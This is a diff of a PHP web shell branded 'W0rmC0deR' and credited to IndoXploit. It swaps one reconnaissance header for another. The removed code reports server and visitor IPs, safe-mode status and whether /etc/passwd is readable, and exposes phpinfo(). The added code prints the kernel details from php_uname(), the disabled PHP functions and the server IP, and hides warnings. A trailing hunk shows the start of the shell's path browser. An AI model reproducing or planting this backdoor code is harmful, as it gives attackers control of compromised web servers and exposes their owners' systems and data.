@@ -1,22 +1,15 @@
 <tr><td>
 <center>
 <?php
-$etc_passwd = @is_readable("/etc/passwd") ? "<b><span style=\"color:white\">ON </span></b>" : "<b><span style=\"color:red\"/>off </span></b>";
-echo '<b><font color=red>Server IP  :   </b></font><b>'.$_SERVER['SERVER_ADDR'].' </b>';
-echo '<b><font color=red>Your IP :  </b></font><b>'.$_SERVER['REMOTE_ADDR'].'</b>';
-echo "</br>";
-echo "<b><font color=red>Safe Mode :  </font></b>";
-// Check for safe mode
-if( ini_get('safe_mode') ) {
-  print '<font color=#FF0000><b> ON</b></font>';
-} else {
-  print '<font color=#008000><b> OFF</b></font>';
-}
-echo "</br>";
-echo "<b><font color=red>Read etc/passwd : </font></b><b>$etc_passwd</b>";
-echo "<b><font color=red>Functions : </font><b>";echo "<a href='$php_self?p=info'>PHP INFO </a>";
-if(@$_GET['p']=="info"){@phpinfo();
-exit;}
+<?php
+#######################
+#Thank's to IndoXploit#
+#######################
+error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
+$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
+echo "<b><font color='green'><br>Server IP : ".gethostbyname($_SERVER['HTTP_HOST'])."</b></font>";
+echo "<b><font color='green'><br>".php_uname()."</b></font><br>";
+echo "<b><font color='green'>Disable Functions: $show_ds</b></font><br><br>";
 ?>
 <br>
 </center>
@@ -78,7 +71,7 @@ border-radius:5px;
 </style>
 </HEAD>
 <BODY>
-<H1><center><font color="Red">$ W0rmC0deR $</font></center></H1>
+<H1><center><font color="Purple">$ W0rmC0deR $</font></center></H1>
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>Current Path : ';
 if(isset($_GET['path'])){
